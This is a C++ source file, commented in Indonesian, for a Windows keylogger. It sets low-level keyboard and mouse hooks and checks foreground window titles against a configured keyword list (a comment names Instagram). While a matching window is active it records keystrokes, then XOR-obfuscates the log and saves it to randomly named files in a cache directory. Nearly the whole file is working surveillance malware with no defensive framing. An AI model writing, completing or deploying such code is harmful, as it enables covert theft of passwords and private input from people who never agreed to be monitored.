#include "keylogger.h"
#include "utils.h"
#include "encryption.h"
#include "config.h" // Menghubungkan ke Config::BLACKLIST agar terpusat
#include <iostream>
#include <fstream>
#include <filesystem>
#include <random>
#include <ctime>
#include <thread>
#include <chrono>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <mutex>
#include <algorithm> // Wajib untuk std::transform

using namespace std;

// --- Globals ---
std::atomic<bool> isRunning{ true };
// Note: Definisi rawKeyQueue menggunakan tipe KeyEvent yang sudah didefinisikan di keylogger.h
std::queue<KeyEvent> rawKeyQueue; 
std::mutex queueMtx;
std::condition_variable queueCv;

static std::string sessionBuffer;
static std::string currentWindow;
static std::string pendingHeader; // Menyimpan header sampai user mengetik sesuatu
static bool isTargetActive = false; 
static bool isPasswordMode = false; 
static std::mutex bufferMtx;

// --- Globals Baru ---
std::atomic<bool> isSensitiveContext{ true }; // Flag utama untuk mulai/berhenti merekam

std::string GetRandomSuffix(int length) {
    static const char alphanum[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    std::string s;
    static bool seeded = false;
    if (!seeded) {
        srand(static_cast<unsigned int>(time(0)));
        seeded = true;
    }
    for (int i = 0; i < length; ++i) {
        s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    return s;
}

// --- Perbaikan 1: Pemetaan Simbol Unik & Karakter Akurat ---
std::string MapKeyToString(DWORD vkCode, bool shift, bool caps) {
    // Tombol Kontrol Dasar
    if (vkCode == VK_BACK)   return "[BKSP]"; 
    if (vkCode == VK_RETURN) {
        isPasswordMode = false; 
        return "\n";
    }
    if (vkCode == VK_SPACE)  return " ";
    if (vkCode == VK_TAB) {
        return " [TAB] ";
    }

    // Fix: Jangan panggil GetKeyState di sini (Worker Thread), gunakan parameter yang dikirim
    BYTE keyboardState[256] = {0};
    
    // Kita set manual state-nya agar sesuai dengan saat tombol ditekan
    if (shift) keyboardState[VK_SHIFT] = 0x80;
    if (caps) keyboardState[VK_CAPITAL] = 0x01;

    WCHAR buffer[5];
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result > 0) {
        std::wstring ws(buffer, result);
        return std::string(ws.begin(), ws.end());
    }

    return "";
}

// --- Perbaikan Tambahan: Smart Append & Header Logic ---
void AppendToBuffer(std::string key) {
    std::lock_guard<std::mutex> lock(bufferMtx);
    
    // Jika ada header yang tertunda, masukkan sekarang karena user mulai mengetik
    if (!pendingHeader.empty()) {
        sessionBuffer += pendingHeader;
        pendingHeader.clear();
    }

    if (key == "[BKSP]") {
        if (!sessionBuffer.empty()) {
            if (sessionBuffer.back() == ' ' || sessionBuffer.back() == ']') {
                 sessionBuffer += "[BKSP]";
            } else if (sessionBuffer.back() != '\n') {
                sessionBuffer.pop_back(); 
            }
        }
    } else {
        sessionBuffer += key;
    }
}

// --- Perbaikan 2: Deteksi Konteks (Hanya Siapkan Header) ---
void ContextMonitorWorker() {
    while (isRunning) {
        char title[256];
        HWND hwnd = GetForegroundWindow();
        if (hwnd != NULL && GetWindowTextA(hwnd, title, sizeof(title)) > 0) {
            std::string winTitle(title);
            
            if (winTitle != currentWindow) {
                // 1. Cek apakah jendela baru mengandung kata kunci terlarang dari Config::BLACKLIST
                string winTitleLower = winTitle;
                transform(winTitleLower.begin(), winTitleLower.end(), winTitleLower.begin(), ::tolower);

                bool matched = false;
                for (const auto& key : Config::BLACKLIST) {
                    string keyLower = key;
                    transform(keyLower.begin(), keyLower.end(), keyLower.begin(), ::tolower);
                    
                    // Pencocokan Substring Case-Insensitive (Menangani kasus seperti "(1) Instagram")
                    if (winTitleLower.find(keyLower) != string::npos) {
                        matched = true;
                        break;
                    }
                }

                // 2. Jika pindah dari sensitif ke tidak sensitif, simpan data yang lama
                if (isSensitiveContext && !matched) {
                    FlushKeylogToDisk();
                }

                // 3. Update status global
                isSensitiveContext = matched;
                isTargetActive = matched; // Agar ProcessorWorker aktif
                currentWindow = winTitle;

                if (isSensitiveContext) {
                    std::lock_guard<std::mutex> lock(bufferMtx);
                    pendingHeader = "\n\n[TARGET DETECTED: " + winTitle + "]\n> ";
                }
            }
        }
        
        // "Sleep time" agar tidak membebani CPU
        std::this_thread::sleep_for(std::chrono::milliseconds(1000)); 
    }
}

// --- Perbaikan 3: Pemroses Log ---
void KeylogProcessorWorker() {
    while (isRunning) {
        KeyEvent evt; 
        {
            std::unique_lock<std::mutex> lock(queueMtx);
            queueCv.wait(lock, [] { return !rawKeyQueue.empty() || !isRunning; });
            if (!isRunning && rawKeyQueue.empty()) break;
            
            evt = rawKeyQueue.front();
            rawKeyQueue.pop();
        }

        // Filter data agar hanya merekam saat konteks sensitif aktif
        if (isSensitiveContext) { 
            std::string keyStr = MapKeyToString(evt.vkCode, evt.isShift, evt.isCaps);
            
            if (!keyStr.empty()) {
                AppendToBuffer(keyStr);
            }
        }
    }
}

// --- Perbaikan 4: Logika Simpan (Hanya Jika Ada Ketikan > 2) ---
void FlushKeylogToDisk() {
    std::string dataToSave;
    {
        std::lock_guard<std::mutex> lock(bufferMtx);
        
        // Simpan hanya jika ada isi pengetikan asli (bukan sekadar header)
        if (sessionBuffer.empty() || sessionBuffer.length() < 2) return;
        
        dataToSave = sessionBuffer;
        sessionBuffer.clear();
    }

    std::vector<BYTE> encrypted(dataToSave.begin(), dataToSave.end());
    XORData(encrypted);

    try {
        std::filesystem::path p_dir = GetCache("keylog");
        if (!std::filesystem::exists(p_dir)) {
            std::filesystem::create_directories(p_dir);
        }
        
        std::string fileName = "kb_" + GetRandomSuffix(6) + ".dat";
        std::ofstream ofs(p_dir / fileName, std::ios::binary | std::ios::out);
        
        if (ofs.is_open()) {
            ofs.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
            ofs.flush();
            ofs.close();
        }
    } catch (...) {}
}

// --- Perbaikan 5: Penanganan Hook ---
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
            std::unique_lock<std::mutex> lock(bufferMtx, std::try_to_lock);
            if (lock.owns_lock()) {
                if (!sessionBuffer.empty() && sessionBuffer.back() != '\n' && sessionBuffer.back() != ' ') {
                    sessionBuffer += " [CLICK] ";
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        
        KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        
        KeyEvent evt = { kbs->vkCode, shift, caps };

        {
            std::lock_guard<std::mutex> lock(queueMtx);
            rawKeyQueue.push(evt);
        }
        queueCv.notify_one();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeylogLoop() {
    isRunning = true;
    std::thread m(ContextMonitorWorker);
    std::thread p(KeylogProcessorWorker);

    HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    HHOOK hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, GetModuleHandle(NULL), 0);

    if (hKeyHook) {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hKeyHook);
        if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
    }

    isRunning = false;
    queueCv.notify_all();
    if (m.joinable()) m.join();
    if (p.joinable()) p.join();
    
    FlushKeylogToDisk();
}